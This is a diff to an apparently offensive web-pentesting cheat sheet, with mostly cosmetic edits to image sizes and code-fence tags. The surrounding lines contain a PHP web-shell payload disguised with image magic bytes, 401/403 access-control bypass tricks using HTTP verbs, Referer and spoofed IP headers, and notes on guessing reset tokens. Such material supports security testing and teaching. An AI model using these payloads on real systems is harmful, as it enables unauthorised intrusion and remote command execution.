@@ -259,7 +259,6 @@ mv evil.jpg evil.php.jpg
 head -c 20 example.png > magic.php && echo "<?php system($_GET['cmd']);?>" >> magic.php
 ```
 
-
 ### Bypass 401/403
 
 #### Try differnet verbs to access the file-> `GET`, `HEAD`, `POST`, `PUT`, `DELETE`, `CONNECT`, `OPTIONS`, `TRACE`, `PATCH`, `INVENTED`, `HACK`
@@ -272,11 +271,11 @@ GET / + Referer : https://site.com/api/GetUser --> 200
 or
 GET /api/getUser + Referer : https://site.com/api/GetUser --> 200
 ```
-<img src="/assets/img/401-403-bypass.jpeg?raw=true" width="600" height="600"/>
-<img src="/assets/img/401-403-bypass1.jpeg?raw=true" width="600" height="600"/>
-<img src="/assets/img/401-403-bypass-payload.jpeg?raw=true" width="600" height="600"/>
+<img src="/assets/img/401-403-bypass.jpeg?raw=true" width="600" height="700"/>
+<img src="/assets/img/401-403-bypass1.jpeg?raw=true" width="600" height="700"/>
+<img src="/assets/img/401-403-bypass-payload.jpeg?raw=true" width="600" height="700"/>
 
-```
+```http
 X-Originating-IP: 127.0.0.1
 X-Forwarded-For: 127.0.0.1
 X-Forwarded: 127.0.0.1
@@ -309,7 +308,7 @@ X-Forwarded-For: 127.0.0.1 -> 200
 4. Try to figure out how token are generated
 
 
-<img src="/assets/img/password-reset.jpeg?raw=true" width="500" height="600"/>
+<img src="/assets/img/password-reset.jpeg?raw=true" width="800" height="600"/>
 
 -------------------------------------------------------------------------------------------------------------
 # PHP filters
